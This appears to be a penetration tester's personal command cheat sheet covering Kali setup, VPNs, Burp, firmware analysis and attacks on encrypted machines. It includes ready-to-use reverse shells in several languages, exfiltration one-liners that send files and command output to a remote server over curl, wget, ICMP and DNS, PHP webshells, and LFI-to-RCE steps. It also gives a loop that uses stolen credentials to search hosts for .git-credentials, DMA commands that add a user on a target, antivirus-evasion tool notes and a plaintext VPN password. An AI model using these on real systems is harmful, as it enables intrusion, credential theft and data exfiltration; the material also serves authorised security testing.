sudo dd if=kali-linux-2016.1-i386/kali-linux-2016.1-i386.iso of=/dev/sdb bs=512k
-----------

-----------Create a KALI USB ENCRYPTED & PERSISTENT (all as root)
end=7gb																				--> size in Gb of the persistent partition
read start _ < <(du -bcm kali-linux-1.0.8-amd64.iso | tail -1); echo $start			--> to know the start point and size
parted /dev/sdb mkpart primary $start $end											--> ok, ignore, ok, creates the partition
# -
cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb3						--> creates LUKS encryption
cryptsetup luksOpen /dev/sdb3 my_usb												--> open LUKS
# -
mkfs.ext3 -L persistence /dev/mapper/my_usb											--> creates ext3 filesystem
e2label /dev/mapper/my_usb persistence												--> label it as persistence
# -
mkdir -p /mnt/my_usb	
mount /dev/mapper/my_usb /mnt/my_usb
echo "/ union" > /mnt/my_usb/persistence.conf
umount /dev/mapper/my_usb
# -
cryptsetup luksClose /dev/mapper/my_usb												--> close LUKS
-----------

-----------Quick setup raspberry:
sudo apt-get install -y pv curl python-pip unzip
sudo pip install awscli
git clone https://github.com/hypriot/flash; cd flash
./flash https://downloads.raspberrypi.org/raspbian_lite_latest
ssh pi@raspberrypi.local
-----------

-----------Config easily a VPN server on a Raspberry Pi
-Install Raspian Jessie Lite
curl -L https://install.pivpn.io | bash			--> (http://www.pivpn.io/)
-Login https://www.duckdns.org/
-Install in cron (raspberry) https://www.duckdns.org/install.jsp
-Add the dynamic dns to the pivpn
-Finally it's generated the .ovpn file
-Copy the file in the client
-apt-get install -y openvpn
-open router port
-openvpn Myfile.ovpn 	(working in kali, use NAT mode to avoid 192.168.x.x conflict)
-----------

-----------OpenVPN server easy
# https://www.ostechnix.com/easiest-way-install-configure-openvpn-server-linux/
wget https://git.io/vpn -O openvpn-install.sh
sudo bash openvpn-install.sh
-----------

-----------Openvpn Kali auto
# http://blog.deadlypenguin.com/blog/2017/04/24/vpn-auto-connect-command-line/
apt-get install network-manager-openvpn
nmcli connection import type openvpn file atl-a01.ovpn
nmcli connection show
vim /etc/NetworkManager/system-connections/alt-a01
	#Change this from 1 to 0 so that it doesn't try to load the keyring
	password-flags=0
	#Add this under the [vpn] section
	username=johnnyeveryteen@usenetserver
	[vpn-secrets]
	password=MarilynMonroe-bot
nmcli connection reload atl-a01
nmcli connection up atl-a01

#autoconnect
vim /root/bin/keepvpnup
	#!/bin/bash
	VPNNAME='atl-a01'
	VPNSTATUS=$(nmcli connection show --active $VPNNAME | wc -l)
  	if [ "$VPNSTATUS" == "0" ]
  	then
    	nmcli connection up $VPNNAME > /dev/null 2>&1
	fi

#crontab
crontab -e
@reboot /root/bin/keepvpnup
* * * * * /root/bin/keepvpnup
-----------

-----------Antivirus evsion
Shellter 				--> Inject into a program .exe (it takes a minut to connect after the execution)
Venom 					--> good one (.hta is recommended)
Veil-Evader
Evade av 				--> complement to make aleatory actions at the beginning --> https://github.com/hvqzao/evadeav
Powershell to memory 	--> https://www.securityartwork.es/2017/02/01/evadiendo-antivirus-windows-powershell/
-----------

-----------Routersploit - router exploitation framework
~/Programas Auditoria/routersploit
./rsf.py
use scanners/autopown
show options
set target 172.18.XX.XX
-----------

-----------Asciinema
asciinema auth 									--> to create a token to link with your private account
asciinema rec -t "My git tutorial"
sed -i "s/pepe/octoyouknowman/g" asciicast-86215.json 
-----------

-----------Terminal to gif
# https://github.com/icholy/ttygif
-----------
 
-----------Haveibeenpowned ~/Shared_VMs/dx (leaks)
# Tool to use haveibeenpowned API https://www.kitploit.com/2018/05/pwnedornot-tool-to-find-passwords-for.html
grep pepe * | cut -d ":" -f 2 | while read line; do echo "--"$line; ./consulta.sh $line; sleep 2; done
-----------

-----------Linkedin find hash (leaks)
grep @company 1.sql.txt | while read line; do id=`echo $line|cut -d "'" -f 2`; initial="$(echo $id | head -c 1)"; echo $line; grep -m 1 $id $initial.txt;done
-----------

-----------Send mail (SMTP)
# https://www.smtp2go.com/					--> free gmail alternative online
sendmail -f pepe@xxxxxx.com -t pepe2@xxx.com -u "Subjecttt" -m "bodyy" -s smtp.gmail.com:587 -o tls=yes -xu pepesendmail@gmail.com -xp xxxxxxxx
-----------

-----------Send mail directly
echo "Subject: sendmail test" | sendmail -v my@email.com
-----------

-----------Spoof mail
# https://www.the-empire.systems/linux/easily-spoof-e-mail
From a server with WAN access
# https://github.com/lunarca/SimpleEmailSpoofer
-----------

-----------Tunneling VNC and BURP through SSH
apt-get install tightvncserver 			--> install it in the remote server
vncpasswd 								--> change password
ssh -i Clave_SSH -L 8081:localhost:8081 -L 5901:localhost:5901 usuario@IP 		--> tunnelize VNC and 8080 port through SSH
vncserver :1 							--> run in the server, to accept connections
- Client: vncviewer 127.0.0.X1:5901
- Kill: vncserver -kill :1
- Burp: add 127.0.0.X1:8081 to the Socks proxy
-----------

-----------Tunnelize Burp Putty
Add a 8081 Dynnamic port to the Tunnel
Burp: add 127.0.0.X1:8081 to the Socks proxy
-----------

-----------Open curl query on firefox (usually for stealed cookies)
curl blablabla | firefox "data:text/html;base64,$(base64 -w 0 <&0)"
-----------

-----------Join on bash
join file1 file2    	--> joins files by a common column, in this case the 1st one
-----------

-----------CodeMirror installation
sudo apt-get install git
git clone https://github.com/codemirror/CodeMirror
cd CodeMirror
curl -sL https://deb.nodesource.com/setup_4.x | sudo -E bash -
sudo apt-get install -y nodejs
npm install
-----------

-----------Show Ascii table
man ascii
-----------

-----------Books with good content
# The art of exploitation
- OSI Layers (0x430 Peeling back to the Lower Layers)
-----------

-----------Bugbounty strategy
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology_and_enumeration.md
https://www.youtube.com/watch?v=KDo68Laayh8
https://www.youtube.com/watch?v=FXCzdWm2qDg&list=PLpr-xdpM8wG8RHOguwOZhUHkKiDeWpvFp&index=41
# https://www.hackerone.com/blog/how-to-recon-and-content-discovery
-----------

-----------Bugbounty Resources
# https://github.com/ngalongc/bug-bounty-reference
# https://pentester.land/list-of-bug-bounty-writeups.html				--> writeups
-----------

-----------Metasploit add new modules to the external modules path
~/.msf4/modules/							--> for new modules
/opt/metasploit-framework/modules/
reload_all
-----------

-----------Metasploit classes and methods definitions
http://rapid7.github.io/metasploit-framework/api/Rex/Post/Meterpreter/Ui/Console/CommandDispatcher/Stdapi/Sys.html#cmd_execute-instance_method
-----------

-----------Bug fuzzers
http://lcamtuf.coredump.cx/afl/
Phzzer			--> PHP7
http://resources.infosecinstitute.com/intro-to-fuzzing/#gref
spike / sully
-----------

-----------TCP tunnel through HTTP
# https://github.com/sensepost/reDuh
# https://sensepost.com/discover/tools/reGeorg/
-----------

-----------IPSec VPN vs SSL VPN
# http://searchsecurity.techtarget.com/feature/Tunnel-vision-Choosing-a-VPN-SSL-VPN-vs-IPSec-VPN
IPSecc access to the network vs SSL VPN access to the application
-----------

-----------Protocols cheatsheet
dropbox/hack/chuletas protocolos
-----------

-----------Multiple lists
# https://github.com/danielmiessler/SecLists
Discovery
Fuzzing
IOCs
Passwords
Pattern_Matching 
Payloads
Usernames
-----------

-----------Get my public IP curl
curl myexternalip.com/raw
-----------

-----------Burp Used Extensions
AWS Security Checks
Active Scan++
Additional Scanner Checks
Auto Repeater
Autorize
Backslash Powered Scanner			--> Server side injections scanner
CO2
CSP Auditor
CSP Bypass
CSRF Scanner
CMD Scanner
Content Type Converter
Copy As Python-Requests
Detect Dynamic JS
Error Message Checks
Freddy, Deserialization Bug Finder
HTML5 Auditor
Hackvertor
J2EEScan
JSON Beautifier
Java Deserialization Scanner
JSON Web Tokens
JSON Web Token Attacker
PHP Object Injection Check
Param miner
Paramalyzer
Retire.js
Software Version Reporter
Software Vulnerability Scanner
WSDL Wizard
Web Cache Deception Scanner
Wsdler
# Not actively used:
Site Map Fetcher
Reflected Parameters
Reflected File Download
ParrotNG
Same Origin Method Execution
# TO CHECK:
ElasticBurp
http://www.kitploit.com/2017/05/airachnid-burp-extension-burp-extension.html		--> to detect Web Cache Deception attack
-----------

-----------BugBounty list
# https://www.vulnerability-lab.com/list-of-bug-bounty-programs.php
# https://bugcrowd.com/list-of-bug-bounty-programs
# https://hackerone.com
-----------

-----------Powershell empire - create .dll to inject
# listeners
set Name Eternal
set Host http://10.0.2.X7
set Port 8080
execute
--
usestager dll Eternal
set Arch x86
execute
-----------

-----------Powershell empire manage agent
agents
list
interact XSHWFSHPC3B1YEGC
-----------

-----------API monitor
# http://www.rohitab.com/apimonitor
Monitor application and services calls on windows
-----------

-----------HSTS Supercookies
# https://nakedsecurity.sophos.com/2015/02/02/anatomy-of-a-browser-dilemma-how-hsts-supercookies-make-you-choose-between-privacy-or-security/
-----------

-----------SSH using the pass as a parameter
sshpass -p <password> ssh <host>@X.X.X.X -p 20122 -oStrictHostKeyChecking=no <command>
# Execute command (without killing the while)
cat creds.txt | while read line; do ip=$(echo $line|cut -d "," -f 1); pass=$(echo $line|cut -d "," -f 3); echo "--IP: $ip"; sshpass
-p $pass ssh -n root@$ip -oStrictHostKeyChecking=no "find / -wholename \"*.git-credentials\""; done
-----------

-----------Redirect port - windows
shell echo y | plink.exe -ssh 10.10.14.5 -P 8080 -C -N -l usernameexample -pw passwordexample -R 10.10.14.5:4444:10.10.122.15:3389
-----------

-----------View virtual hosts routes/ports on Apache
apachectl -S
apache2ctl -S
-----------

-----------Capture Screenshot Websites
# https://github.com/ChrisTruncer/EyeWitness
# It accepts, nessus or nmap files, or also custom ones.
./EyeWitness.py -x file.nessus --all-protocols --prepend-https --timeout 10 --show-selenium
-----------

-----------Redirect command execution output to a remote server (data exfiltration)
### CURL
ps aux|curl http://<your-server> -d @-
# For bash execution through website maybe is needed the ${IFS} expression which is the same as a spaca
ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-

### Netcat (Linux)
nc –l –p {port} < {file/to/extract}

### Netcat (Windows)
type {file to extract}  | nc -L -p {port}

### Wget
wget –post-data exfil=`cat /data/secret/secretcode.txt` http://X.X.X.X:YYYY
wget –post-file trophy.php http://X.X.X.X:YYYY

### Telnet
telnet X.X.X.X {port} < {file to transfer}

### SMB
net use h: \\X.X.X.X\web /user:{username} {password} && copy {File to Copy} h:\{filename}.txt

### ICMP
cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 X.X.X.X; done

### DNS
cat /data/secret/password.txt | while read exfil; do host $exfil.web.com 192.168.107.X135; done
-----------

-----------From LFI (Local File Inclusion) to RCE
# http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal
The easiest way is to find if the website has an uploader and find the local path where they store it.
There are other ways like injecting the PHP commands on the User-Agent and then access to the /proc/self/environ. Or reading the /var/log/apache2/access.log after sending an HTTP request with a malicious PHP code.
# /proc/self/environ:
Inject in the User-Agent to the HTTP_USER_AGENT variable
# /proc/*/fd/*:
Upload many shells and start to scrap with different PID.
PID can be found here /proc/sched_debug or /var/run/apache2/apache2.pid.
# PHP sessions
Look for the path of user's sessionid: /var/lib/php5/sess_[PHPSESSID]
Modify the username: user=<?php system("cat /etc/passwd");?>
Access to the file with LFI.
# Apache logs
-----------

-----------LFI interesting paths
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal
/etc/issue
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
/proc/self/environ				--> RCE (HTTP_USER_AGENT)
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/var/run/apache2/apache2.pid
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
-----------

-----------PHP webshells
# https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/
# https://github.com/scipag/PHPUtilities/blob/master/shell.php			--> all of them here
# system:
<?php system("dir");?>
# exec:
<?php exec("ls -la");?>
# shell_exec:
<?php echo shell_exec(“ls -la“);?>
# passthru:
<?php passsthru(“ls -la“);?>
# proc_open:		--> second link
# preg_replace:
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>			--> /e is deprecated
-----------

-----------Reverse shell
# https://github.com/ismailtasdelen/reverse-shell-cheatsheet
### Php:
php -r '$sock=fsockopen("192.168.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
### Python:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
### Bash:
bash -i >& /dev/tcp/192.168.0.1/8080 0>&1
### Netcat:
nc -e /bin/sh 192.168.0.5 4444
### Perl:
perl -e 'use Socket;$i="192.168.0.5";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
### Ruby:
ruby -rsocket -e'f=TCPSocket.open("192.168.0.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
### Java:
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5< >/dev/tcp/192.168.0.5/4444;cat <& 5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
### xterm:
xterm -display 192.168.0.5:4444
-----------

-----------Binwalk - decompress .bin firmware
binwalk file.bin
-----------

-----------DD - Extract sqashfs filesystem
# Binwalk output:
# DECIMAL       HEXADECIMAL     DESCRIPTION
# 512           0x200           LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 3420708 bytes
# 1134468       0x114F84        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 13089146 bytes, 2102 inodes, blocksize: 262144 bytes, created: 2016-10-28 05:42:31
dd if=upgrade-1.1.3.bin of=upgrade.squashfs bs=1 skip=1134468 count=13089146
-----------

-----------Mount sqashfs filesystem
unsquashfs upgrade.squashfs
-----------

-----------Emulate firmware - QEMU
readelf -h ./binary				--> check the Machine row to discover the architecture
cp /usr/bin/qemu-mips-static .	--> in the folder of the mounted firmware filesystem
chmod +x qemu-mips-static
sudo chroot .					--> in the folder of the mounted firmware filesystem
sudo chroot . ./qemu-mips-static ./bin/binary		--> execute the binary emulating the firmware
-----------

-----------Honeydoc
# With a 1 pixel image
https://github.com/jqreator/honeydoc
# It's also possible to do it with authenticode 
https://www.youtube.com/watch?v=YgR2B-lobn0
-----------

-----------Honeypots
# http://www.elladodelmal.com/2017/07/t-pot-una-colmena-de-honeypots-para.html
# https://github.com/paralax/awesome-honeypots
-----------

-----------Tensorflow Machine Learning
# http://www.bigendiandata.com/2017-07-12-Tensor_Chicken/
# https://www.youtube.com/watch?v=YF2dm6GZf2U&feature=youtu.be
# https://github.com/aymericdamien/TensorFlow-Examples
# https://www.tensorflow.org/tutorials/
# https://github.com/jivoi/awesome-ml-for-cybersecurity				--> infosec machine learning resources
-----------

-----------Scrapy static code
# https://kaismh.wordpress.com/2016/04/29/extracting-data-from-websites-using-scrapy/
# Use SelectorGadget Chrome extension to easily find the CSS/XPATH routes to the elements
# Shell to test some cases:
scrapy shell "https://example.com"
response.css('title')
-----------

-----------Scrapy-splash to dynamic javascript generated code in AWS
# https://github.com/scrapy-plugins/scrapy-splash
# Install Docker Community in AWS
# Install:
sudo pip install scrapy
sudo yum install gcc
sudo pip install scrapy-splash
sudo pip install scrapyjs
# Run docker's Splash:
docker run -p 8050:8050 scrapinghub/splash
# Shell to test some cases:
scrapy shell 'http://127.0.0.1:8050/render.html?url=https://example.com?timeout=20&wait=10'			--> wait command to wait until js finishes
# Create a project with scrapy-splash:
scrapy startproject example
scrapy genspider example example.com
echo "SPLASH_URL = 'http://127.0.0.1:8050/'
DOWNLOADER_MIDDLEWARES = {'scrapyjs.SplashMiddleware': 725,}
DUPEFILTER_CLASS = 'scrapyjs.SplashAwareDupeFilter'" >> ./example/example/settings.py				--> add the Splash settings
cd example
scrapy crawl example				--> run the spider
-----------

-----------Splash-scrapy with proxy to avoid Security Policies and execute JavaScript
# Run docker's Splash:
mkdir -p /home/ubuntu/splash_docker/proxy-profiles
vim /home/ubuntu/splash_docker/proxy-profiles/default.ini
	[proxy]
  	host=172.17.0.1						--> default host docker IP
    port=8080
    type=HTTP
docker run -p 8050:8050 -v /home/ubuntu/splash_docker/proxy-profiles:/etc/splash/proxy-profiles:ro scrapinghub/splash
# Run mitmproxy replacing the Policy
mitmproxy --replace /~s/Content-Security-Policy/Bye-Bye-Policy
-----------

-----------Side channel attack (Hardware)
# https://www.youtube.com/watch?v=BHqrA8lzz2o
# https://www.youtube.com/watch?v=FktI4qSjzaE
https://newae.com/tools/chipwhisperer/
http://seclist.us/jlsca-side-channel-attack-toolkit.html
-----------

-----------Github - vulnerabilities, credentials, endpoints
# https://gist.github.com/EdOverflow/922549f610b258f459b219a32f92d10b
### Basic keyword list to look for:
API and key. (Get some more endpoints and find API keys.)
token
secret
TODO
password
vulnerable
http:// & https://
CSRF
random
hash
MD5, SHA-1, SHA-2, etc.
HMAC
### Tools:
# Gitrob			--> sensitive information in public GitHub repositories
git clone https://github.com/michenriksen/gitrob
gitrob analyze acme,johndoe,janedoe
# TruffleHog		--> For finding high entropy strings (API keys, tokens, passswords, etc.),
git clone https://github.com/dxa4481/truffleHog
truffleHog https://github.com/dxa4481/truffleHog.git
# Git-all-secrets 	--> all-in-one secrets finder (combines multiple open source secrets finders)
git clone https://github.com/anshumanbh/git-all-secrets
# Brakeman			--> static analysis security scanner for Ruby on rails
http://brakemanscanner.org/
# LinkFinder		--> to discover endpoints in JavaScript files
git clone https://github.com/GerbenJavado/LinkFinder
python linkfinder.py -i 'path/to/your/code/*.js' -r ^/api/ -o cli
-----------

-----------Bypass IP/DNS reputation services with CDN (Content Delivery Network) - Domain Fronting
# AWS CloudFront, Cloudflare, Akamai, etc 
# http://www.areopago21.org/2017/08/domain-fronting.html
-----------

-----------Mitmproxy Ubuntu setup and configuration (to use it from the same machine)
# Install:
sudo apt-get install python3-dev python3-pip libffi-dev libssl-dev
sudo pip3 install mitmproxy
# Open ports: 80, 443				--> not necessary if you run it in the same machine
# Install the certificates:
mitmproxy			--> run it to generate the certificates
cd ~/.mitmproxy		--> certificates inside
sudo mkdir /usr/share/ca-certificates/mitmproxy
sudo cp ~/.mitmproxy/mitmproxy-ca-cert.cer /usr/share/ca-certificates/mitmproxy/mitmproxy-ca-cert.crt
sudo dpkg-reconfigure ca-certificates			--> and activate certs (cat /etc/ca-certificates.conf) to view them all
mitmproxy			--> Regular proxy
#> -Type of Proxies explained
-----------

-----------Mitmproxy replace
# http://docs.mitmproxy.org/en/stable/features/filters.html					--> filters
# Replace in the response
mitmproxy --replace /~s/script/pepe
-----------

-----------BDFProxy - Patch Binaries via MiTM – BackdoorFactory + mitmproxy
# https://www.darknet.org.uk/2019/02/bdfproxy-patch-binaries-via-mitm-backdoorfactory-mitmproxy/?utm_source=feedly&utm_medium=webfeeds
-----------

-----------Iterm2 color profile
# https://github.com/mbadolato/iTerm2-Color-Schemes/blob/master/schemes/DimmedMonokai.itermcolors
-----------

-----------.bash_profile terminal colors (iterm2)
export CLICOLOR=1
export LSCOLORS=GxFxCxDxBxegedabagaced
function prompt {
  local BLACK="\[\033[0;30m\]"
  local BLACKBOLD="\[\033[1;30m\]"
  local RED="\[\033[0;31m\]"
  local REDBOLD="\[\033[1;31m\]"
  local GREEN="\[\033[0;32m\]"
  local GREENBOLD="\[\033[1;32m\]"
  local YELLOW="\[\033[0;33m\]"
  local YELLOWBOLD="\[\033[1;33m\]"
  local BLUE="\[\033[0;34m\]"
  local BLUEBOLD="\[\033[1;34m\]"
  local PURPLE="\[\033[0;35m\]"
  local PURPLEBOLD="\[\033[1;35m\]"
  local CYAN="\[\033[0;36m\]"
  local CYANBOLD="\[\033[1;36m\]"
  local WHITE="\[\033[0;37m\]"
  local WHITEBOLD="\[\033[1;37m\]"
  local RESETCOLOR="\[\e[00m\]"
  export PS1='\[\e[1;33m\]\u@\[\e[1;35m\]\h:\w\$\[\e[0;37m\] '
}
prompt
-----------

-----------.vimrc terminal colors (iterm2)
" enable 256 colors in GNOME terminal (for my Ubuntu VM)
if $COLORTERM == 'gnome-terminal'
    set t_Co=256
endif

" turn on language specific syntax highlighting
syntax on
-----------

-----------Attack vectors against Encrypted Machines
# DMA
Mitigated by IOMMU/VT-d, disabling DMA in the BIOS, windows registers, Bitlocker with Pin (Try DMA in recovery mode)

# Cold Boot attack
Mitigated by Bitlocker with Pin if the machine is switched off
Small kernel to boot: Easy2Boot
http://rmprepusb.blogspot.nl/2014/07/add-cold-boot-attack-to-easy2boot.html

# BIOS without credentials
Could lead to other attacks like DMA as it's possible to remove the VT-d protection

# BIOS reset
There are different ways to reset the BIOS depending on the manufacturer.
- Removing the internal battery of the motherboard.
- Removing a jumper in the motherboard and press the switch on button to drain the capacitors.
- Boot an USB with specific file generated by the manufacturer with your UUID (there are some generator scripts)
Could lead to other attacks like DMA as it's possible to remove the VT-d protection

# Bootloader Order
Could lead to DMA, some manufacturers allow to reset the BIOS booting a USB with a specifically generated file. 
Also would ease the Cold Boot attack.

# Bitlocker Pin bruteforce
If it's 4 digits seems that it's possible to get access in one year, as every try block the TPM for 2 hours.
Could be possible to change the time to fool it?

# TPM Infineon vulnerability (CVE-2017-15361)
There is an issue in the generation of the RSA keys which protect the encryption key of Bitlocker.
The ROCA attack can ease the exploitation in the case of 1024-bit keys and a much more expensive for 2048-bit.

# Misconfiguration in the PCR (TPM)
The PCR profiles are stored inside the TPM chipset and they are in charge of ensuring the "root of trust" of the computer, if it fails in some point, the TPM won't release the encryption key of Bitlocker
and Windows will ask automatically for the Bitlocker Recovery Key.
Every PCR profile that it's enabled it's signed with a hash, and it obviously won't match if any change happens there.
Command to check the PCRs (and Bitlocker Recovery Key): manage-bde -protectors -get c:
http://sangnak.com/how-to-configure-bitlocker-drive-encryption/
http://windowstech.net/change-bitlocker-tpm-platform-validation-profile-on-the-go/
--PCR Profiles Definition
0	BIOS
1	BIOS configuration
2	Option ROMs
3	Option ROM configuration
4	MBR (master boot record)
5	MBR configuration (Partition table)
6	State transitions and wake events
7	Platform manufacturer specific measurements
8–15	Static operating system
	10	Boot Manager
	11 	BitLocker Access Control
16	Debug
23	Application support

# Re-flashing BIOS
A possible approach to this attack could be a hardened system with the PCR(0) disabled. In this case we could re-flash the BIOS, disable the VT-d protection and execute a DMA attack.
https://forums.mydigitallife.net/threads/hp-elitebook-70-series-bios-password-reset-util-test.56701/page-2#post-1386270

# Secure Boot
Secure boot is in charge to check the signature of the OS that wants to boot in the system. 
Initially was just for Windows but now a days a lot of OS have this signature as it's not very expensive (Ubuntu, Debian, etc.)

# TPM Reset Attack (1/2 theoretical)
The objective is to short the reset pin of the TPM chip to force the reset of the PCR tables, which could allow us to execute other attacks.
It works straigh forward in TPM 1.1. Apparently in 1.2 could be possible but it's not so simple, so there are no POCs for now. In TPM 2.0 I think it's not possible.
http://www.cs.dartmouth.edu/~pkilab/sparks/
http://os.inf.tu-dresden.de/papers_ps/kauer07-oslo.pdf
https://rdist.root.org/2007/07/17/tpm-hardware-attacks-part-2/

# LPC hijack TPM (1/2 theoretical)
It's a bit hard as TPM is very security aware, but could be nice to research on it.
http://www.sciencedirect.com/science/article/pii/S0898122112004634?via%3Dihub#br000070

# Modify encrypted data (theoretical)
In the last versions of Windows, in AES-CBC Elephant diffusion was removed, so it's possible to swap bits to modify content, obviously very difficult as you don't know what are you modifying.
They also give the option to use XTS-AES which solves this problem.

# Access directly to the DRAM memory (1/2 theoretical, no POC for now)
Connect directly to the memory through the pins of de DRAM in the motherboard.
https://www.blackhat.com/docs/us-17/wednesday/us-17-Trikalinou-Taking-DMA-Attacks-To-The-Next-Level-How-To-Do-Arbitrary-Memory-Reads-Writes-In-A-Live-And-Unmodified-System-Using-A-Rogue-Memory-Controller.pdf
-----------

-----------DMA attack
# Description
Access to memory directly from PCIe ports which could also be, Firewire, Thundervolt or other connectors like M.2 AE (internal wifi modules)

# Mitigations
IOMMU/ VT-d in Intel, 
Disable DMA in the BIOS, 
Disable DMA in lock screen via Windows registers
Bitlocker with Pin

# Hardware
USB3380-EVB				--> Cheaper but it can only dump 4Gb of the memory
SP605/FT601 + FTDI		--> More expensive, but you can dump the whole memory, faster and useful for other projects
https://www.digikey.com/product-detail/en/xilinx-inc/EK-S6-SP605-G/122-1605-ND/2175980
https://www.digikey.com/product-detail/en/ftdi-future-technology-devices-international-ltd/UMFT601X-B/768-1303-ND/6556764

# Cables for SP605
The FPGA has a PCIe finger.
PCIe to Mini PCIe.				--> https://www.allekabels.nl/delock/6335/1267239/delock-riser-card-mini-pci-express-pci-express-x1-left-insertion-13-cm.html#
M.2 AE adapter to Mini PCIe 	--> https://www.allekabels.nl/m2-ssd/15535/1453339/m2-ngff-naar-mini-pcie-adapter.html

# Flashing the SP605
First it's possible to check that the board is working okay with the examples of the flashcard with the S1[0001]. Some demos of Xilinx only work in Windows XP, even if they run in W7.
Follow the instructions of the pcileech-fpga, build it's also necessary if you want to flash the last version or you want to modify the schema of the FPGA.
https://github.com/ufrisk/pcileech-fpga/tree/master/sp605_ft601

# Preparing pcileech for SP605
For the FPGA there is only compatibility for Windows right now, you can use W7 or W10
Clone the project 	--> https://github.com/ufrisk/pcileech
Add the FTD3XX.dll library to "pcileech/pcileech_files/"	--> http://www.ftdichip.com/Drivers/D3XX/FTD3XXLibrary_v1.2.0.6.zip
Connect the USB3 cable to the laptop, Windows should detect the FTDI driver
The cables should be as short as possible.
Remove the foil from the cables if they have.

# Runnig pcileech with SP605
Connect all the cables to the target and host computer.
Switch on the FPGA and wait until the DS3 and DS4 LEDs switch to solid.
The host computer should detect the USB as FTDI.
Switch on the computer, then only the DS5 LED should be solid. (In any other case the attack won't work, see the meaning of the LEDs in the pcileech documentation)
Execute: pcileech/pcileech_files/pcileech.exe probe
If you start to dump some memory, it's okay even if some of the pages fail.

# Pcileech useful commands
https://github.com/ufrisk/pcileech													--> more examples
pcileech.exe dump -help																--> more info about the command
pcileech.exe dump -min 0x000000000 -max 0x200000000 -out "C:\test.dump"				--> dump for 8Gb
pcileech.exe dump -min 0x000000000 -max 0x200000000 -out "C:\test.dump" -force		--> in the normal mode when if fails 16Mb in a row they abort the attack
pcileech.exe kmdload -kmd win10x64													--> charge another Kernel module in memory, we will receive the address where it's charged (ex. 0x7efff000)
pcileech.exe wx64_pslist –kmd 0x7efff000											--> listing processes, will be useful later to attach to one of these processes
pcileech.exe wx64_pscreate –s “c:\windows\system32.exe /c net user \/add test test” -0 0x0f10 –kmd 0x7fffe000		--> creating a user, -0 with the process id

# Future work
- Bypass VT-d in recovery mode
- Try to figure out how to get better dumps (less failed pages)
- Try other shorter cables
- Explore other commands/options
- Understand better the IDE project running in the FPGA
-----------

-----------Cold Boot
# http://www.rmprepusb.com/tutorials/124
# http://rmprepusb.blogspot.nl/2014/07/add-cold-boot-attack-to-easy2boot.html
Easy2Boot
-----------

-----------TPM module
# https://blogs.technet.microsoft.com/dubaisec/2017/02/28/tpm-owner-password/
-----------

-----------TPM sniff attack
# https://pulsesecurity.co.nz/articles/TPM-sniffing
-----------

-----------Transparent Proxy - Burp
# Add burp proxy 192.168.3.1:9999 and support for invisible proxies
# If you are in an internal network with proxy, maybe it's necessary to add the prerouting (8080) and add it to the [User Options]Upstream Proxies of Burp.
# It's also possible to add positive/negative filters in the Upstream Proxy to redirect internal or external sites to the proxy.
iptables -L
# interface connected to internet
inet=eth1
# interface connected to the pc
intern=eth0
# proxy port
proxyPort=9999
ifconfig $intern 192.168.3.1
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $inet -j MASQUERADE
# forwarding http and https to the proxy
iptables -t nat -A PREROUTING -i $intern -p tcp --dport 80 -j REDIRECT --to-ports $proxyPort
iptables -t nat -A PREROUTING -i $intern -p tcp --dport 443 -j REDIRECT --to-ports $proxyPort
# iptables -t nat -A PREROUTING -i $intern -p tcp --dport 8080 -j REDIRECT --to-ports $proxyPort
# DHCP server
dnsmasq --no-daemon --bind-interfaces --interface=$intern --dhcp-range=$intern,192.168.3.2,192.168.3.199,12h --listen-address=127.0.0.1 --listen-address=192.168.3.1 --dhcp-option=3,192.168.3.1
# Show iptables
iptables -nvL -t nat
# It's possible that finally would be necessary to force <ifconfig eth0 192.168.3.1> if the NetworkManager modifies it.
-----------

-----------Iptables essentials
# https://github.com/trimstray/iptables-essentials
-----------

-----------SAML
# https://www.youtube.com/watch?time_continue=2512&v=87sa5b72ot8
# https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf
-----------

-----------Compile/Run C# in linux
sudo apt-get install mono-mcs
mcs Program.cs /r:./bin/Debug/MsgKit.dll /r:./bin/Debug/MimeKit.dll
mono Program.exe
-----------

-----------Dotless IP
# http://www.hackplayers.com/2018/01/dotless-ip-otra-forma-mas-de-llamar-un-host.html
127.0.0.1 -> http://2130706433
-----------

-----------Webdav with SSL
#https://www.webdavsystem.com/server/access/windows/
\\server@SSL@port\DavWWWRoot\path\
-----------

-----------Mail servers anti-spam/anti-spoof protections
#Sender Policy Framework (SPF)
SPF records allow domain owners to publish a list of IP addresses or subnets that are authorized to send email on their behalf.
-->How to check it:
dig example.com NS		-->Output: example.com.		86400	IN	NS	ns.jamotipoki.com.
